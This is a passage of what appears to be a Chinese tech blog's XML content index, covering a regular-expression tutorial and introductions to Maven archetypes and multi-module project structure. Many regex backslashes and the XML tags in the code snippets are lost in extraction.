  -T STRING             --title-prefix=STRING                           
  -c URL                --css=URL                                       
                        --reference-odt=FILENAME                        
                        --reference-docx=FILENAME                       
                        --epub-stylesheet=FILENAME                      
                        --epub-cover-image=FILENAME                     
                        --epub-metadata=FILENAME                        
                        --epub-embed-font=FILE                          
                        --epub-chapter-level=NUMBER                     
                        --latex-engine=PROGRAM                          
                        --latex-engine-opt=STRING                       
                        --bibliography=FILE                             
                        --csl=FILE                                      
                        --citation-abbreviations=FILE                   
                        --natbib                                        
                        --biblatex                                      
  -m[URL]               --latexmathml[=URL], --asciimathml[=URL]        
                        --mathml[=URL]                                  
                        --mimetex[=URL]                                 
                        --webtex[=URL]                                  
                        --jsmath[=URL]                                  
                        --mathjax[=URL]                                 
                        --katex[=URL]                                   
                        --katex-stylesheet=URL                          
                        --gladtex                                       
                        --trace                                         
                        --dump-args                                     
                        --ignore-args                                   
                        --verbose                                       
                        --bash-completion                               
                        --list-input-formats                            
                        --list-output-formats                           
                        --list-extensions                               
                        --list-highlight-languages                      
                        --list-highlight-styles                         
  -v                    --version                                       
  -h                    --help                                          
</code></pre>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>神器</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式规则</title>
    <url>/blog/tools/regex/regexrule/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>正则表达式（regular expression）就是用一个”字符串”来描述一个特征，然后去验证另一个”字符串”是否符合这个特征。比如表达式”ab+” 描述的特征是”一个 ‘a’ 和 任意个 ‘b’ “，那么 ‘ab’, ‘abb’,’abbbbbbbbbb’ 都符合这个特征。</p>
<p>正则表达式可以用来：（1）验证字符串是否符合指定特征，比如验证是否是合法的邮件地址。（2）用来查找字符串，从一个长的文本中查找符合指定特征的字符串，比查找固定字符串更加灵活方便。（3）用来替换，比普通的替换更强大。</p>
<p>正则表达式学习起来其实是很简单的，不多的几个较为抽象的概念也很容易理解。之所以很多人感觉正则表达式比较复杂，一方面是因为大多数的文档没有做到由浅入深地讲解，概念上没有注意先后顺序，给读者的理解带来困难；另一方面，各种引擎自带的文档一般都要介绍它特有的功能，然而这部分特有的功能并不是我们首先要理解的。</p>
<p>文章中的每一个举例，都可以点击进入到测试页面进行测试。闲话少说，开始。</p>
<h2 id="正则表达式规则"><a href="#正则表达式规则" class="headerlink" title="正则表达式规则"></a>正则表达式规则</h2><h2 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h2><p>字母、数字、汉字、下划线、以及后边章节中没有特殊定义的标点符号，都是”普通字符”。表达式中的普通字符，在匹配一个字符串的时候，匹配与之相同的一个字符。</p>
<p>举例1：表达式 “c”，在匹配字符串 “abcde”时，匹配结果是：成功；匹配到的内容是：”c”；匹配到的位置是：开始于2，结束于3。（注：下标从0开始还是从1开始，因当前编程语言的不同而可能不同）</p>
<p>举例2：表达式 “bcd”，在匹配字符串 “abcde”时，匹配结果是：成功；匹配到的内容是：”bcd”；匹配到的位置是：开始于1，结束于4。</p>
<h2 id="简单的转义字符"><a href="#简单的转义字符" class="headerlink" title="简单的转义字符"></a>简单的转义字符</h2><p>一些不便书写的字符，采用在前面加 “&quot;的方法。这些字符其实我们都已经熟知了。</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>可匹配</th>
</tr>
</thead>
<tbody><tr>
<td>\r, \n</td>
<td>代表回车和换行符</td>
</tr>
<tr>
<td>\t</td>
<td>制表符</td>
</tr>
<tr>
<td>\</td>
<td>代表 “” 本身</td>
</tr>
</tbody></table>
<p>还有其他一些在后边章节中有特殊用处的标点符号，在前面加 “”后，就代表该符号本身。比如：^, $ 都有特殊意义，如果要想匹配字符串中”^“ 和 “$“ 字符，则表达式就需要写成 “^“ 和 “$“。</p>
<p>  表达式|  可匹配<br>  ——|- ———————<br>  ^    |  匹配 ^ 符号本身<br>  $    |  匹配 $ 符号本身<br>  .     |  匹配小数点（.）本身</p>
<p>这些转义字符的匹配方法与 “普通字符”是类似的。也是匹配与之相同的一个字符。</p>
<p>举例1：表达式 “$d”，在匹配字符串 “abc$de”时，匹配结果是：成功；匹配到的内容是：”$d”；匹配到的位置是：开始于3，结束于5。</p>
<h2 id="能够与-‘多种字符’-匹配的表达式"><a href="#能够与-‘多种字符’-匹配的表达式" class="headerlink" title="能够与 ‘多种字符’ 匹配的表达式"></a>能够与 ‘多种字符’ 匹配的表达式</h2><p>正则表达式中的一些表示方法，可以匹配 ‘多种字符’其中的任意一个字符。比如，表达式 “d”可以匹配任意一个数字。虽然可以匹配其中任意字符，但是只能是一个，不是多个。这就好比玩扑克牌时候，大小王可以代替任意一张牌，但是只能代替一张牌。</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>可匹配</th>
</tr>
</thead>
<tbody><tr>
<td>\d</td>
<td>任意一个数字，0~9 中的任意一个</td>
</tr>
<tr>
<td>\w</td>
<td>任意一个字母或数字或下划线，也就是 A~Z,a~z,0~9,_ 中任意一个</td>
</tr>
<tr>
<td>\s</td>
<td>包括空格、制表符、换页符等空白字符的其中任意一个</td>
</tr>
<tr>
<td>.</td>
<td>小数点可以匹配除了换行符（n）以外的任意一个字符</td>
</tr>
</tbody></table>
<p>举例1：表达式 “dd”，在匹配 “abc123″时，匹配的结果是：成功；匹配到的内容是：”12″；匹配到的位置是：开始于3，结束于5。</p>
<p>举例2：表达式 “a.d”，在匹配 “aaa100″时，匹配的结果是：成功；匹配到的内容是：”aa1″；匹配到的位置是：开始于1，结束于4。</p>
<h2 id="自定义能够匹配-‘多种字符’-的表达式"><a href="#自定义能够匹配-‘多种字符’-的表达式" class="headerlink" title="自定义能够匹配 ‘多种字符’ 的表达式"></a>自定义能够匹配 ‘多种字符’ 的表达式</h2><p>使用方括号 [ ] 包含一系列字符，能够匹配其中任意一个字符。用 [^ ]包含一系列字符，则能够匹配其中字符之外的任意一个字符。同样的道理，虽然可以匹配其中任意一个，但是只能是一个，不是多个。</p>
<hr>
<p>  表达式         可匹配<br>  [ab5@]       匹配 “a” 或 “b” 或 “5″ 或 “@”<br>  [^abc]      匹配 “a”,”b”,”c” 之外的任意一个字符<br>  [f-k]        匹配 “f”<del>“k” 之间的任意一个字母<br>  [^A-F0-3]   匹配 “A”</del>“F”,”0″~”3″ 之外的任意一个字符</p>
<hr>
<p>举例1：表达式 “[bcd][bcd]“ 匹配 “abc123″时，匹配的结果是：成功；匹配到的内容是：”bc”；匹配到的位置是：开始于1，结束于3。</p>
<p>举例2：表达式 “[^abc]“ 匹配 “abc123″时，匹配的结果是：成功；匹配到的内容是：”1″；匹配到的位置是：开始于3，结束于4。</p>
<h2 id="修饰匹配次数的特殊符号"><a href="#修饰匹配次数的特殊符号" class="headerlink" title="修饰匹配次数的特殊符号"></a>修饰匹配次数的特殊符号</h2><p>前面章节中讲到的表达式，无论是只能匹配一种字符的表达式，还是可以匹配多种字符其中任意一个的表达式，都只能匹配一次。如果使用表达式再加上修饰匹配次数的特殊符号，那么不用重复书写表达式就可以重复匹配。</p>
<p>使用方法是：”次数修饰”放在”被修饰的表达式”后边。比如：”[bcd][bcd]“可以写成 “[bcd]{2}”。</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>{n}</td>
<td>表达式重复n次，比如： “w{2}” 相当于 “ww”； “a{5}” 相当于 “aaaaa”</td>
</tr>
<tr>
<td>{m,n}</td>
<td>表达式至少重复m次，最多重复n次，比如： “ba{1,3}”可以匹配 “ba”或”baa”或”baaa”</td>
</tr>
<tr>
<td>{m,}</td>
<td>表达式至少重复m次，比如： “wd{2,}”可以匹配 “a12″,”_456″,”M12344″…</td>
</tr>
<tr>
<td>?</td>
<td>匹配表达式0次或者1次，相当于 {0,1}，比如： “a[cd]?”可以匹配 “a”,”ac”,”ad”</td>
</tr>
<tr>
<td>+</td>
<td>表达式至少出现1次，相当于 {1,}，比如： “a+b”可以匹配 “ab”,”aab”,”aaab”…</td>
</tr>
<tr>
<td>*</td>
<td>表达式不出现或出现任意次，相当于 {0,}，比如： “^*b”可以匹配 “b”,”^^^b”…</td>
</tr>
</tbody></table>
<p>举例1：表达式 “d+.?d*“ 在匹配 “It costs $12.5″时，匹配的结果是：成功；匹配到的内容是：”12.5″；匹配到的位置是：开始于10，结束于14。</p>
<p>举例2：表达式 “go{2,8}gle” 在匹配 “Ads by goooooogle”时，匹配的结果是：成功；匹配到的内容是：”goooooogle”；匹配到的位置是：开始于7，结束于17。</p>
<h2 id="其他一些代表抽象意义的特殊符号"><a href="#其他一些代表抽象意义的特殊符号" class="headerlink" title="其他一些代表抽象意义的特殊符号"></a>其他一些代表抽象意义的特殊符号</h2><p>一些符号在表达式中代表抽象的特殊意义：</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>与字符串开始的地方匹配，不匹配任何字符</td>
</tr>
<tr>
<td>$</td>
<td>与字符串结束的地方匹配，不匹配任何字符</td>
</tr>
<tr>
<td>\b</td>
<td>匹配一个单词边界，也就是单词和空格之间的位置，不匹配任何字符</td>
</tr>
</tbody></table>
<p>进一步的文字说明仍然比较抽象，因此，举例帮助大家理解。</p>
<p>举例1：表达式 “^aaa” 在匹配 “xxx aaa xxx” 时，匹配结果是：失败。因为”^“ 要求与字符串开始的地方匹配，因此，只有当 “aaa”位于字符串的开头的时候，”^aaa” 才能匹配， 比如：”aaa xxx xxx”。</p>
<p>举例2：表达式 “aaa$“ 在匹配 “xxx aaa xxx” 时，匹配结果是：失败。因为”$“ 要求与字符串结束的地方匹配，因此，只有当 “aaa”<br>位于字符串的结尾的时候，”aaa$“ 才能匹配， 比如：”xxx xxx aaa”。</p>
<p>举例3：表达式 “.b.” 在匹配 “@@@abc”时，匹配结果是：成功；匹配到的内容是：”@a”；匹配到的位置是：开始于2，结束于4。</p>
<p>进一步说明：”b” 与 “^“ 和 “$“类似，本身不匹配任何字符，但是它要求它在匹配结果中所处位置的左右两边，其中一边是<br>“w” 范围，另一边是 非”w” 的范围。</p>
<p>举例4：表达式 “bendb” 在匹配 “weekend,endfor,end”时，匹配结果是：成功；匹配到的内容是：”end”；匹配到的位置是：开始于15，结束于18。</p>
<p>一些符号可以影响表达式内部的子表达式之间的关系：</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>|</td>
<td>左右两边表达式之间 “或” 关系，匹配左边或者右边</td>
</tr>
<tr>
<td>( )</td>
<td>(1). 在被修饰匹配次数的时候，括号中的表达式可以作为整体被修饰(2). 取匹配结果的时候，括号中的表达式匹配到的内容可以被单独得到</td>
</tr>
</tbody></table>
<p>举例5：表达式 “Tom|Jack” 在匹配字符串 “I’m Tom, he is Jack”时，匹配结果是：成功；匹配到的内容是：”Tom”；匹配到的位置是：开始于4，结束于7。匹配下一个时，匹配结果是：成功；匹配到的内容是：”Jack”；匹配到的位置时：开始于15，结束于19。</p>
<p>举例6：表达式 “(gos*)+” 在匹配 “Let’s go go go!”时，匹配结果是：成功；匹配到内容是：”go go go”；匹配到的位置是：开始于6，结束于14。</p>
<p>举例7：表达式 “￥(d+.?d*)” 在匹配 “＄10.9,￥20.5″时，匹配的结果是：成功；匹配到的内容是：”￥20.5″；匹配到的位置是：开始于6，结束于10。单独获取括号范围匹配到的内容是：”20.5″。</p>
<h2 id="正则表达式中的一些高级规则"><a href="#正则表达式中的一些高级规则" class="headerlink" title="正则表达式中的一些高级规则"></a>正则表达式中的一些高级规则</h2><h2 id="匹配次数中的贪婪与非贪婪"><a href="#匹配次数中的贪婪与非贪婪" class="headerlink" title="匹配次数中的贪婪与非贪婪"></a>匹配次数中的贪婪与非贪婪</h2><p>在使用修饰匹配次数的特殊符号时，有几种表示方法可以使同一个表达式能够匹配不同的次数，比如：”{m,n}”,”{m,}”, “?”, “*“,”+”，具体匹配的次数随被匹配的字符串而定。这种重复匹配不定次数的表达式在匹配过程中，总是尽可能多的匹配。比如，针对文本”dxxxdxxxd”，举例如下：</p>
<hr>
<table>
<thead>
<tr>
<th>表达式</th>
<th>匹配结果</th>
</tr>
</thead>
<tbody><tr>
<td>(d)(w+)</td>
<td>“w+” 将匹配第一个 “d” 之后的所有字符 “xxxdxxxd”</td>
</tr>
<tr>
<td>(d)(w+)(d)</td>
<td>“w+” 将匹配第一个 “d” 和最后一个 “d” 之间的所有字符 “xxxdxxx”。虽然 “w+” 也能够匹配上最后一个 “d”，但是为了使整个表达式匹配成功，”w+” 可以 “让出” 它本来能够匹配的最后一个 “d”</td>
</tr>
</tbody></table>
<p>由此可见，”w+”在匹配的时候，总是尽可能多的匹配符合它规则的字符。虽然第二个举例中，它没有匹配最后一个”d”，但那也是为了让整个表达式能够匹配成功。同理，带 “*“ 和 “{m,n}”的表达式都是尽可能地多匹配，带 “?”的表达式在可匹配可不匹配的时候，也是尽可能的 “要匹配”。这种匹配原则就叫作 “贪婪” 模式 。</p>
<p>非贪婪模式：</p>
<p>在修饰匹配次数的特殊符号后再加上一个 “?”号，则可以使匹配次数不定的表达式尽可能少的匹配，使可匹配可不匹配的表达式，尽可能的”不匹配”。这种匹配原则叫作 “非贪婪” 模式，也叫作 “勉强”模式。如果少匹配就会导致整个表达式匹配失败的时候，与贪婪模式类似，非贪婪模式会最小限度的再匹配一些，以使整个表达式匹配成功。举例如下，针对文本”dxxxdxxxd” 举例：</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>匹配结果</th>
</tr>
</thead>
<tbody><tr>
<td>(d)(w+?)</td>
<td>“w+?” 将尽可能少的匹配第一个 “d” 之后的字符，结果是：”w+?” 只匹配了一个 “x”</td>
</tr>
<tr>
<td>(d)(w+?)(d)</td>
<td>为了让整个表达式匹配成功，”w+?” 不得不匹配 “xxx” 才可以让后边的 “d” 匹配，从而使整个表达式匹配成功。因此，结果是：”w+?” 匹配 “xxx”</td>
</tr>
</tbody></table>
<p>更多的情况，举例如下：</p>
<p>举例1：表达式 “(.*)” 与字符串 “aa bb” 匹配时，匹配的结果是：成功；匹配到的内容是 “aa bb” 整个字符串， 表达式中的 “” 将与字符串中最后一个 “” 匹配。</p>
<p>举例2：相比之下，表达式 “(.*?)” 匹配举例1中同样的字符串时，将只得到 “aa”， 再次匹配下一个时，可以得到第二个 “bb”。</p>
<h2 id="反向引用-1-2…"><a href="#反向引用-1-2…" class="headerlink" title="反向引用 1, 2…"></a>反向引用 1, 2…</h2><p>表达式在匹配时，表达式引擎会将小括号 “( )”包含的表达式所匹配到的字符串记录下来。在获取匹配结果的时候，小括号包含的表达式所匹配到的字符串可以单独获取。这一点，在前面的举例中，已经多次展示了。在实际应用场合中，当用某种边界来查找，而所要获取的内容又不包含边界时，必须使用小括号来指定所要的范围。比如前面的”(.*?)”。</p>
<p>其实，”小括号包含的表达式所匹配到的字符串”不仅是在匹配结束后才可以使用，在匹配过程中也可以使用。表达式后边的部分，可以引用前面”括号内的子匹配已经匹配到的字符串”。引用方法是 “” 加上一个数字。”1″引用第1对括号内匹配到的字符串，”2″引用第2对括号内匹配到的字符串……以此类推，如果一对括号内包含另一对括号，则外层的括号先排序号。换句话说，哪一对的左括号”(“ 在前，那这一对就先排序号。</p>
<p>举例如下：</p>
<p>举例1：表达式 “(‘|“)(.*?)(1)” 在匹配 “ ‘Hello’, “World” “时，匹配结果是：成功；匹配到的内容是：” ‘Hello’”。再次匹配下一个时，可以匹配到 “ “World” “。</p>
<p>举例2：表达式 “(w)1{4,}” 在匹配 “aa bbbb abcdefg ccccc 111121111 999999999″ 时，匹配结果是：成功；匹配到的内容是”ccccc”。再次匹配下一个时，将得到 999999999。这个表达式要求 “w”范围的字符至少重复5次， 注意与 “w{5,}” 之间的区别。</p>
<p>举例3：表达式 “&lt;(w+)s*(w+(&#x3D;(‘|“).*?4)?s*)*&gt;.*?” 在匹配 “&quot; 时，匹配结果是成功。如果 “” 与 “”不配对，则会匹配失败；如果改成其他配对，也可以匹配成功。</p>
<h2 id="预搜索，不匹配；反向预搜索，不匹配"><a href="#预搜索，不匹配；反向预搜索，不匹配" class="headerlink" title="预搜索，不匹配；反向预搜索，不匹配"></a>预搜索，不匹配；反向预搜索，不匹配</h2><p>前面的章节中，我讲到了几个代表抽象意义的特殊符号：”^“，”$“，”b”。它们都有一个共同点，那就是：它们本身不匹配任何字符，只是对”字符串的两头” 或者 “字符之间的缝隙”附加了一个条件。理解到这个概念以后，本节将继续介绍另外一种对 “两头” 或者”缝隙” 附加条件的，更加灵活的表示方法。</p>
<p>正向预搜索：”(?&#x3D;xxxxx)”，”(?!xxxxx)”</p>
<p>格式：”(?&#x3D;xxxxx)”，在被匹配的字符串中，它对所处的 “缝隙” 或者 “两头”附加的条件是：所在缝隙的右侧，必须能够匹配上 xxxxx这部分的表达式。因为它只是在此作为这个缝隙上附加的条件，所以它并不影响后边的表达式去真正匹配这个缝隙之后的字符。这就类似”b”，本身不匹配任何字符。”b”只是将所在缝隙之前、之后的字符取来进行了一下判断，不会影响后边的表达式来真正的匹配。</p>
<p>举例1：表达式 “Windows (?&#x3D;NT|XP)” 在匹配 “Windows 98, Windows NT,Windows 2000″ 时，将只匹配 “Windows NT” 中的 “Windows “，其他的 “Windows” 字样则不被匹配。</p>
<p>举例2：表达式 “(w)((?&#x3D;111)(1))+” 在匹配字符串 “aaa ffffff 999999999″时，将可以匹配6个”f”的前4个，可以匹配9个”9″的前7个。这个表达式可以读解成：重复4次以上的字母数字，则匹配其剩下最后2位之前的部分。当然，这个表达式可以不这样写，在此的目的是作为演示之用。</p>
<p>格式：”(?!xxxxx)”，所在缝隙的右侧，必须不能匹配 xxxxx 这部分表达式。</p>
<p>举例3：表达式 “((?!bstopb).)+” 在匹配 “fdjka ljfdl stop fjdsla fdj”时，将从头一直匹配到 “stop” 之前的位置，如果字符串中没有”stop”，则匹配整个字符串。</p>
<p>举例4：表达式 “do(?!w)” 在匹配字符串 “done, do, dog” 时，只能匹配”do”。在本条举例中，”do” 后边使用 “(?!w)” 和使用 “b” 效果是一样的。</p>
<p>反向预搜索：”(?&lt;&#x3D;xxxxx)”，”(?</p>
<p>这两种格式的概念和正向预搜索是类似的，反向预搜索要求的条件是：所在缝隙的”左侧”，两种格式分别要求必须能够匹配和必须不能够匹配指定表达式，而不是去判断右侧。与”正向预搜索”一样的是：它们都是对所在缝隙的一种附加条件，本身都不匹配任何字符。</p>
<p>举例5：表达式 “(?&lt;&#x3D;d{4})d+(?&#x3D;d{4})” 在匹配 “1234567890123456″时，将匹配除了前4个数字和后4个数字之外的中间8个数字。由于 JScript.RegExp不支持反向预搜索，因此，本条举例不能够进行演示。很多其他的引擎可以支持反向预搜索，比如：Java1.4 以上的 java.util.regex 包，.NET 中System.Text.RegularExpressions命名空间，以及本站推荐的最简单易用的 DEELX 正则引擎。</p>
<h2 id="其他通用规则"><a href="#其他通用规则" class="headerlink" title="其他通用规则"></a>其他通用规则</h2><p>还有一些在各个正则表达式引擎之间比较通用的规则，在前面的讲解过程中没有提到。</p>
<p>表达式中，可以使用 “xXX” 和 “uXXXX” 表示一个字符（”X”表示一个十六进制数）</p>
<table>
<thead>
<tr>
<th>形式</th>
<th>字符范围</th>
</tr>
</thead>
<tbody><tr>
<td>xXX</td>
<td>编号在 0 ~ 255 范围的字符，比如： 空格可以使用 “x20″ 表示</td>
</tr>
<tr>
<td>uXXXX</td>
<td>任何字符可以使用 “u” 再加上其编号的4位十六进制数表示，比如： “u4E2D”</td>
</tr>
</tbody></table>
<p>在表达式 “s”，”d”，”w”，”b”表示特殊意义的同时，对应的大写字母表示相反的意义</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>可匹配</th>
</tr>
</thead>
<tbody><tr>
<td>S</td>
<td>匹配所有非空白字符（”s” 可匹配各个空白字符）</td>
</tr>
<tr>
<td>D</td>
<td>匹配所有的非数字字符</td>
</tr>
<tr>
<td>W</td>
<td>匹配所有的字母、数字、下划线以外的字符</td>
</tr>
<tr>
<td>B</td>
<td>匹配非单词边界，即左右两边都是 “w” 范围或者左右两边都不是 “w” 范围时的字符缝隙</td>
</tr>
</tbody></table>
<p>在表达式中有特殊意义，需要添加 “” 才能匹配该字符本身的字符汇总</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>匹配输入字符串的开始位置。要匹配 “^“ 字符本身，请使用 “^“</td>
</tr>
<tr>
<td>$</td>
<td>匹配输入字符串的结尾位置。要匹配 “$“ 字符本身，请使用 “$“</td>
</tr>
<tr>
<td>( )</td>
<td>标记一个子表达式的开始和结束位置。要匹配小括号，请使用 “(“ 和 “)”</td>
</tr>
<tr>
<td>[ ]</td>
<td>用来自定义能够匹配 ‘多种字符’ 的表达式。要匹配中括号，请使用 “[&quot; 和 &quot;]“</td>
</tr>
<tr>
<td>{ }</td>
<td>修饰匹配次数的符号。要匹配大括号，请使用 “{“ 和 “}”</td>
</tr>
<tr>
<td>.</td>
<td>匹配除了换行符（n）以外的任意一个字符。要匹配小数点本身，请使用 “.”</td>
</tr>
<tr>
<td>?</td>
<td>修饰匹配次数为 0 次或 1 次。要匹配 “?” 字符本身，请使用 “?”</td>
</tr>
<tr>
<td>+</td>
<td>修饰匹配次数为至少 1 次。要匹配 “+” 字符本身，请使用 “+”</td>
</tr>
<tr>
<td>*</td>
<td>修饰匹配次数为 0 次或任意次。要匹配 “*“ 字符本身，请使用 “*“</td>
</tr>
<tr>
<td>|</td>
<td>左右两边表达式之间 “或” 关系。匹配 “|” 本身，请使用 “|”</td>
</tr>
</tbody></table>
<p>括号 “( )” 内的子表达式，如果希望匹配结果不进行记录供以后使用，可以使用”(?:xxxxx)” 格式</p>
<p>举例1：表达式 “(?:(w)1)+” 匹配 “a bbccdd efg” 时，结果是 “bbccdd”。括号”(?:)” 范围的匹配结果不进行记录，因此 “(w)” 使用 “1″ 来引用。</p>
<p>常用的表达式属性设置简介：Ignorecase，Singleline，Multiline，Global</p>
<p>  表达式属性  | 说明<br>    ——-|—-<br>  Ignorecase  | 默认情况下，表达式中的字母是要区分大小写的。配置为 Ignorecase 可使匹配时不区分大小写。有的表达式引擎，把 “大小写” 概念延伸至 UNICODE 范围的大小写。<br>  Singleline |  默认情况下，小数点 “.” 匹配除了换行符（n）以外的字符。配置为 Singleline 可使小数点可匹配包括换行符在内的所有字符。<br>  Multiline  |  默认情况下，表达式 “^“ 和 “$“ 只匹配字符串的开始 ① 和结尾 ④ 位置。如：①xxxxxxxxx②n③xxxxxxxxx④配置为 Multiline 可以使 “^“ 匹配 ① 外，还可以匹配换行符之后，下一行开始前 ③ 的位置，使 “$“ 匹配 ④ 外，还可以匹配换行符之前，一行结束 ② 的位置。<br>  Global     |  主要在将表达式用来替换时起作用，配置为 Global 表示替换所有的匹配。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>神器</tag>
        <tag>正规表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>Maven插件archetype介绍</title>
    <url>/blog/tools/maven/archetype/</url>
    <content><![CDATA[<h2 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h2><p>可以讲Archetype理解成Maven项目的模板，例如maven-archetype-quickstart就是最简单的Maven项目模板，只需提供基本的元素，如groupId,artifactId,version等，它就能生成项目的基本结构及POM文件。</p>
<h3 id="Maven-Archetype-Plugin"><a href="#Maven-Archetype-Plugin" class="headerlink" title="Maven Archetype Plugin"></a>Maven Archetype Plugin</h3><p>\</p>
<h3 id="使用Archetype的一般步骤"><a href="#使用Archetype的一般步骤" class="headerlink" title="使用Archetype的一般步骤"></a>使用Archetype的一般步骤</h3><ul>
<li>命令——mvn archetype:generate</li>
<li>输入命令后，Archetype插件会输出一个Archetype列表供用户选择；选择自己想要使用的Archetype，输入对应编号</li>
<li>提示输入一些基本参数，如groupId,artifactId,version,package等</li>
<li>Archetype插件生成项目骨架</li>
</ul>
<h2 id="常用Archetype"><a href="#常用Archetype" class="headerlink" title="常用Archetype"></a>常用Archetype</h2><h3 id="maven-archetype-quickstart"><a href="#maven-archetype-quickstart" class="headerlink" title="maven-archetype-quickstart"></a>maven-archetype-quickstart</h3><p>默认的Archetype,基本内容包括：</p>
<ul>
<li>一个包含junit依赖声明的pom.xml</li>
<li>src&#x2F;main&#x2F;java主代码目录及一个名为App的类</li>
<li>src&#x2F;test&#x2F;java测试代码目录及一个名为AppTest的测试用例</li>
</ul>
<h3 id="maven-archetype-webapp"><a href="#maven-archetype-webapp" class="headerlink" title="maven-archetype-webapp"></a>maven-archetype-webapp</h3><p>一个最简单的Maven<br>war项目模板，当需要快速创建一个Web应用的时候可以使用它。生成的项目内容包括：</p>
<ul>
<li>一个packaging为war且带有junit依赖声明的pom.xml</li>
<li>src&#x2F;main&#x2F;webapp&#x2F;目录</li>
<li>src&#x2F;main&#x2F;webapp&#x2F;index.jsp文件</li>
<li>src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;web.xml文件</li>
</ul>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title>Maven最佳实践：划分模块</title>
    <url>/blog/tools/maven/model/</url>
    <content><![CDATA[<p>所有用Maven管理的真实的项目都应该是分模块的，每个模块都对应着一个pom.xml。它们之间通过继承和聚合（也称作多模块，multi-module）相互关联。那么，为什么要这么做呢？我们明明在开发一个项目，划分模块后，导入Eclipse变成了N个项目，这会带来复杂度，给开发带来不便。</p>
<p>为了解释原因，假设有这样一个项目，很常见的Java<br>Web应用。在这个应用中，我们分了几层：</p>
<ul>
<li>Dao层负责数据库交互，封装了Hibernate交互的类。</li>
<li>Service层处理业务逻辑，放一些Service接口和实现相关的Bean。</li>
<li>Web层负责与客户端交互，主要有一些Structs的Action类。</li>
</ul>
<p>对应的，在一个项目中，我们会看到一些包名：</p>
<ul>
<li>org.myorg.app.dao</li>
<li>org.myorg.app.service</li>
<li>org.myorg.app.web</li>
<li>org.myorg.app.util</li>
</ul>
<p>这样整个项目的框架就清晰了，但随着项目的进行，你可能会遇到如下问题：</p>
<ol>
<li>这个应用可能需要有一个前台和一个后台管理端（web或者swing），你发现大部分dao，一些service，和大部分util是在两个应用中可。这样的问题，你一周内遇到了好几次。</li>
<li>pom.xml中的依赖列表越来越长以重用的，但是，由于目前只有一个项目（WAR），你不得不新建一个项目依赖这个WAR，这变得非常的恶心，因为在Maven中配置对WAR的依赖远不如依赖JAR那样简单明了，而且你根本不需要org.myorg.app.web。有人修改了dao，提交到svn并且不小心导致build失败了，你在编写service的代码，发现编译不过，只能等那人把dao修复了，你才能继续进行，很多人都在修改，到后来你根本就不清楚哪个依赖是谁需要的，渐渐的，很多不必要的依赖被引入。甚至出现了一个依赖有多个版本存在。</li>
<li>build整个项目的时间越来越长，尽管你只是一直在web层工作，但你不得不build整个项目。</li>
<li>某个模块，比如util，你只想让一些经验丰富的人来维护，可是，现在这种情况，每个开发者都能修改，这导致关键模块的代码质量不能达到你的要求。\</li>
</ol>
<p>我们会发现，其实这里实际上没有遵守一个设计模式原则：”高内聚，低耦合”。虽然我们通过包名划分了层次，并且你还会说，这些包的依赖都是单向的，没有包的环依赖。这很好，但还不够，因为就构建层次来说，所有东西都被耦合在一起了。因此我们需要使用Maven划分模块。</p>
<p> </p>
<p>一个简单的Maven模块结构是这样的：</p>
<pre><code>---- app-parent
             |-- pom.xml (pom)
             |
             |-- app-util
             |        |-- pom.xml (jar)
             |
             |-- app-dao
             |        |-- pom.xml (jar)
             |
             |-- app-service
             |        |-- pom.xml (jar)
             |
             |-- app-web
                      |-- pom.xml (war)  
</code></pre>
<p>上述简单示意图中，有一个父项目(app-parent)聚合很多子项目（app-util,<br>app-dao, app-service,<br>app-web）。每个项目，不管是父子，都含有一个pom.xml文件。而且要注意的是，小括号中标出了每个项目的打包类型。父项目是pom,也只能是pom。子项目有jar，或者war。根据它包含的内容具体考虑。</p>
<p> </p>
<p>这些模块的依赖关系如下：</p>
<p> </p>
<p>app-dao      --&gt; app-util</p>
<p>app-service --&gt; app-dao</p>
<p>app-web     --&gt; app-service</p>
<p> </p>
<p>注意依赖的传递性（大部分情况是传递的，除非你配置了特殊的依赖scope），app-dao依赖于app-util，app-service依赖于app-dao，于是app-service也依赖于app-util。同理，app-web依赖于app-dao,app-util。</p>
<p> </p>
<p>用项目层次的划分替代包层次的划分能给我们带来如下好处：</p>
<ol>
<li>方便重用，如果你有一个新的swing项目需要用到app-dao和app-service，添加对它们的依赖即可，你不再需要去依赖一个WAR。而有些模块，如app-util，完全可以渐渐进化成公司的一份基础工具类库，供所有项目使用。这是模块化最重要的一个目的。</li>
<li>由于你现在划分了模块，每个模块的配置都在各自的pom.xml里，不用再到一个混乱的纷繁复杂的总的POM中寻找自己的配置。</li>
<li>如果你只是在app-dao上工作，你不再需要build整个项目，只要在app-dao目录运行mvn命令进行build即可，这样可以节省时间，尤其是当项目越来越复杂，build越来越耗时后。</li>
<li>某些模块，如app-util被所有人依赖，但你不想给所有人修改，现在你完全可以从这个项目结构出来，做成另外一个项目，svn只给特定的人访问，但仍提供jar给别人使用。</li>
<li>多模块的Maven项目结构支持一些Maven的更有趣的特性（如DepencencyManagement），这留作以后讨论。</li>
</ol>
<p>接下来讨论一下POM配置细节，实际上非常简单，先看app-parent的pom.xml：</p>
<pre><code>    4.0.0
    org.myorg.myapp
    app-parent
    pom
    1.0-SNAPSHOT
    
        app-util
        app-dao
        app-service
        app-web
    
</code></pre>
